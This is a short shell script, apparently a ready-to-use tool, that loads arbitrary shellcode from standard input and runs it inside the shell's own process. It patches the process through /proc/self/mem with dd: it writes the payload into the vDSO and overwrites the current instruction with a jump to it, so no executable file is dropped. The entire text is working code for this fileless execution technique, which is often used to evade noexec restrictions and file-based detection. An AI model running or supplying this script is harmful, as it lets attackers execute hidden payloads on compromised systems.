#!/bin/sh

filename=/bin/dd

# Prepend the shellcode with an infinite loop (so I can attach to it with gdb)
# Then in gdb just use `set *(short*)$pc=0x9090' and you will be able to `si'
if [ -z "$DEBUG" ]; then DEBUG=0; fi

# Endian conversion
endian()
{
    echo -n ${1:14:2}${1:12:2}${1:10:2}${1:8:2}${1:6:2}${1:4:2}${1:2:2}${1:0:2}
}

# Read shellcode from stdin
if [ "$1" = "-x" ]
then
    read -r sc
else
    sc=$(od -v -t x1 | head -n-1 | cut -d' ' -f2- | tr -d ' \n')
fi

# dup2(2, 0);
sc="4831c04889c6b0024889c7b0210f05"$sc
sc_len=$(printf %016x $((${#sc} / 2)))

shell=$(readlink -f /proc/$$/exe)
# Make zsh behave somewhat like bash
if [ -n "$($shell --version 2> /dev/null | grep zsh)" ]
then
    setopt SH_WORD_SPLIT
    setopt KSH_ARRAYS
fi

# The shellcode will be written into the vDSO
vdso_addr=$((0x$(grep -F "[vdso]" /proc/$$/maps | cut -d'-' -f1)))
# Trampoline to jump to the shellcode
jmp="48b8"$(endian $(printf %016x $vdso_addr))"ffe0"

sc=$(printf $sc | sed 's/\([0-9A-F]\{2\}\)/\\x\1/gI')
jmp=$(printf $jmp | sed 's/\([0-9A-F]\{2\}\)/\\x\1/gI')

read syscall_info < /proc/self/syscall
addr=$(($(echo $syscall_info | cut -d' ' -f9)))
exec 3>/proc/self/mem
# Write the shellcode
printf $sc  | $filename bs=1 seek=$vdso_addr >&3 2>/dev/null
exec 3>&-
exec 3>/proc/self/mem
# I'm going in, wish me good luck
printf $jmp | $filename bs=1 seek=$addr      >&3 2>/dev/null
